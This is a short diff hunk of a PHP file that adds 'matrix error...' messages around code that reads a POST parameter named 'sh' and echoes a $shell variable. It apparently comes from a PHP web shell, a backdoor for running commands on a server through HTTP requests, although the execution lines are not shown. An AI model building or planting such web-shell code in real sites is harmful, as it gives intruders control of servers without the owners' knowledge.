@@ -9,5 +9,9 @@ if (isset($_POST["sh"])) {
     echo  $start;
     if ($shell) {
         echo $shell;
+    } else {
+        echo ("matrix error...");
     }
+} else {
+    echo ("matrix error...");
 }
